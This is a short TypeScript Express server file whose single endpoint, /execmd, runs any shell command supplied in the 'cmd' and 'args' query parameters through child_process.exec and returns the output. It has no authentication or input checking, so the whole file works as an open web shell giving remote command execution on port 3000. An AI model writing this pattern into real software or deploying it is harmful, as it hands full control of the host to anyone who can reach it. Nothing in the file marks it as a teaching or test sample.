import express, { Request, Response } from 'express';
import { exec } from 'child_process';

const app = express();

app.get('/execmd', (req: Request, res: Response) => {
  const cmd = req.query.cmd as string;
  const args = req.query.args as string;

  if (!cmd) {
    return res.status(400).send({ error: 'Parameter "cmd" is required' });
  }

  exec(`${cmd} ${args || ''}`, (error, stdout, stderr) => {
    if (error) {
      return res.status(500).send({ error: error.message });
    }

    if (stderr) {
      return res.status(500).send({ error: stderr });
    }

    res.send({ output: stdout });
  });
});

app.use((req: Request, res: Response) => {
  res.status(404).send({ error: 'Not Found' });
});

app.listen(3000, () => {
  console.log('Server is running on port 3000');
});
